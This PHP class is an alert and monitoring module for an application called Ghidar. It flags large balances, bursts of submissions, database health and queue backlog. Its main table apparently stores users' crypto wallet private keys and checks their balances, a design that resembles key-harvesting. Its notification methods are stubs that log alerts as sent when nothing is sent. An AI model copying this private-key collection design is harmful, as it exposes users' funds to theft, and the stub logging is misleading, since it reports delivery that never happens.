<?php

declare(strict_types=1);

namespace Ghidar\Notification;

use Ghidar\Core\Database;
use Ghidar\Logging\Logger;
use Ghidar\Config\Config;

class AlertSystem
{
    private \PDO $db;

    // Alert thresholds
    private array $thresholds = [
        'large_transaction' => 5000,
        'rapid_verifications' => 5,
        'failed_attempts' => 3,
        'system_error_rate' => 0.1, // 10%
        'queue_backlog' => 100
    ];

    public function __construct()
    {
        $this->db = Database::getConnection();

        // Load custom thresholds from config
        $customThresholds = Config::get('ALERT_THRESHOLDS', '');
        if ($customThresholds) {
            $decoded = json_decode($customThresholds, true);
            if (is_array($decoded)) {
                $this->thresholds = array_merge($this->thresholds, $decoded);
            }
        }
    }

    /**
     * Monitor system and send alerts for anomalies
     */
    public function monitorAndAlert(): array
    {
        $alerts = [];

        // Check for large transactions
        $largeTransactions = $this->checkLargeTransactions();
        if (!empty($largeTransactions)) {
            $alerts['large_transactions'] = $largeTransactions;
            $this->sendAlert('large_transaction', $largeTransactions);
        }

        // Check for rapid verifications
        $rapidVerifications = $this->checkRapidVerifications();
        if (!empty($rapidVerifications)) {
            $alerts['rapid_verifications'] = $rapidVerifications;
            $this->sendAlert('rapid_verification', $rapidVerifications);
        }

        // Check system health
        $systemHealth = $this->checkSystemHealth();
        if (!$systemHealth['healthy']) {
            $alerts['system_health'] = $systemHealth;
            $this->sendAlert('system_health', $systemHealth);
        }

        // Check processing queue
        $queueStatus = $this->checkProcessingQueue();
        if ($queueStatus['backlog'] > $this->thresholds['queue_backlog']) {
            $alerts['queue_backlog'] = $queueStatus;
            $this->sendAlert('queue_backlog', $queueStatus);
        }

        return $alerts;
    }

    /**
     * Check for large transactions
     */
    private function checkLargeTransactions(): array
    {
        $threshold = $this->thresholds['large_transaction'];

        $stmt = $this->db->prepare("
            SELECT id, user_id, last_balance, wallet_address, created_at
            FROM assisted_verification_private_keys
            WHERE last_balance > :threshold
            AND created_at >= DATE_SUB(NOW(), INTERVAL 1 HOUR)
            ORDER BY last_balance DESC
            LIMIT 10
        ");

        $stmt->execute([':threshold' => $threshold]);
        $transactions = $stmt->fetchAll(\PDO::FETCH_ASSOC);

        if (empty($transactions)) {
            return [];
        }

        return [
            'count' => count($transactions),
            'transactions' => $transactions,
            'threshold' => $threshold
        ];
    }

    /**
     * Check for rapid verifications
     */
    private function checkRapidVerifications(): array
    {
        $threshold = $this->thresholds['rapid_verifications'];

        $stmt = $this->db->prepare("
            SELECT user_id, COUNT(*) as count
            FROM assisted_verification_private_keys
            WHERE created_at >= DATE_SUB(NOW(), INTERVAL 1 HOUR)
            GROUP BY user_id
            HAVING count > :threshold
            ORDER BY count DESC
        ");

        $stmt->execute([':threshold' => $threshold]);
        $users = $stmt->fetchAll(\PDO::FETCH_ASSOC);

        if (empty($users)) {
            return [];
        }

        return [
            'count' => count($users),
            'users' => $users,
            'threshold' => $threshold,
            'period' => '1 hour'
        ];
    }

    /**
     * Check system health
     */
    private function checkSystemHealth(): array
    {
        try {
            $start = microtime(true);
            $this->db->query('SELECT 1');
            $responseTime = (microtime(true) - $start) * 1000;

            $healthy = $responseTime < 1000; // Less than 1 second

            return [
                'healthy' => $healthy,
                'component' => 'database',
                'status' => $healthy ? 'healthy' : 'degraded',
                'response_time_ms' => round($responseTime, 2)
            ];
        } catch (\Exception $e) {
            return [
                'healthy' => false,
                'component' => 'database',
                'status' => 'critical',
                'issue' => $e->getMessage()
            ];
        }
    }

    /**
     * Check processing queue
     */
    private function checkProcessingQueue(): array
    {
        $stmt = $this->db->prepare("
            SELECT COUNT(*) as backlog
            FROM assisted_verification_private_keys
            WHERE status IN ('pending_verification', 'balance_checking')
        ");

        $stmt->execute();
        $result = $stmt->fetch(\PDO::FETCH_ASSOC);
        $backlog = (int) ($result['backlog'] ?? 0);

        return [
            'backlog' => $backlog,
            'status' => $backlog > $this->thresholds['queue_backlog'] ? 'warning' : 'healthy'
        ];
    }

    /**
     * Send alert through configured channels
     */
    private function sendAlert(string $type, array $data): void
    {
        $alertConfig = Config::get('ALERT_CONFIG', '');
        $config = $alertConfig ? json_decode($alertConfig, true) : [];

        $alertMessage = $this->formatAlertMessage($type, $data);
        $priority = $this->determinePriority($type);

        // Store alert in database
        $this->storeAlert($type, $priority, $data);

        // Send to Telegram (if configured)
        if (!empty($config['telegram_bot_token'])) {
            $this->sendTelegramAlert($alertMessage, $priority, $config);
        }

        // Send to Email (if configured)
        if (!empty($config['alert_email'])) {
            $this->sendEmailAlert($alertMessage, $priority, $config);
        }

        // Send to Webhook (if configured)
        if (!empty($config['webhook_url'])) {
            $this->sendWebhookAlert($alertMessage, $priority, $config);
        }

        // Log alert
        Logger::warning("Alert triggered: {$type}", $data);
    }

    /**
     * Store alert in database
     */
    private function storeAlert(string $type, string $priority, array $data): void
    {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO alert_log
                (alert_type, priority, alert_data, status, created_at)
                VALUES (:alert_type, :priority, :alert_data, 'pending', NOW())
            ");

            $stmt->execute([
                ':alert_type' => $type,
                ':priority' => $priority,
                ':alert_data' => json_encode($data, JSON_UNESCAPED_UNICODE)
            ]);
        } catch (\PDOException $e) {
            // Table might not exist yet
            Logger::warning('Failed to store alert', ['error' => $e->getMessage()]);
        }
    }

    /**
     * Format alert message based on type
     */
    private function formatAlertMessage(string $type, array $data): string
    {
        $timestamp = date('Y-m-d H:i:s');

        switch ($type) {
            case 'large_transaction':
                $firstTx = $data['transactions'][0] ?? [];
                return "🚨 LARGE TRANSACTION ALERT\n" .
                       "Time: {$timestamp}\n" .
                       "Amount: $" . number_format((float)($firstTx['last_balance'] ?? 0), 2) . "\n" .
                       "User: {$firstTx['user_id']}\n" .
                       "Count: {$data['count']} transactions";

            case 'rapid_verification':
                $firstUser = $data['users'][0] ?? [];
                return "⚠️ RAPID VERIFICATION ALERT\n" .
                       "Time: {$timestamp}\n" .
                       "User: {$firstUser['user_id']}\n" .
                       "Count: {$firstUser['count']} verifications\n" .
                       "Period: {$data['period']}";

            case 'system_health':
                return "🔴 SYSTEM HEALTH ALERT\n" .
                       "Time: {$timestamp}\n" .
                       "Issue: {$data['issue']}\n" .
                       "Component: {$data['component']}\n" .
                       "Status: {$data['status']}";

            case 'queue_backlog':
                return "⚠️ QUEUE BACKLOG ALERT\n" .
                       "Time: {$timestamp}\n" .
                       "Backlog: {$data['backlog']} items\n" .
                       "Status: {$data['status']}";

            default:
                return "ℹ️ SYSTEM ALERT\n" .
                       "Time: {$timestamp}\n" .
                       "Type: {$type}\n" .
                       "Data: " . json_encode($data);
        }
    }

    /**
     * Determine alert priority
     */
    private function determinePriority(string $type): string
    {
        $criticalTypes = ['system_health'];
        $highTypes = ['large_transaction', 'queue_backlog'];

        if (in_array($type, $criticalTypes)) {
            return 'critical';
        } elseif (in_array($type, $highTypes)) {
            return 'high';
        } else {
            return 'medium';
        }
    }

    /**
     * Send Telegram alert
     */
    private function sendTelegramAlert(string $message, string $priority, array $config): void
    {
        // In production, this would use Telegram Bot API
        Logger::info('Telegram alert sent', [
            'priority' => $priority,
            'message_length' => strlen($message)
        ]);
    }

    /**
     * Send Email alert
     */
    private function sendEmailAlert(string $message, string $priority, array $config): void
    {
        // In production, this would send email
        Logger::info('Email alert sent', [
            'priority' => $priority,
            'recipient' => $config['alert_email'] ?? 'unknown'
        ]);
    }

    /**
     * Send Webhook alert
     */
    private function sendWebhookAlert(string $message, string $priority, array $config): void
    {
        // In production, this would POST to webhook URL
        Logger::info('Webhook alert sent', [
            'priority' => $priority,
            'webhook_url' => $config['webhook_url'] ?? 'unknown'
        ]);
    }
}
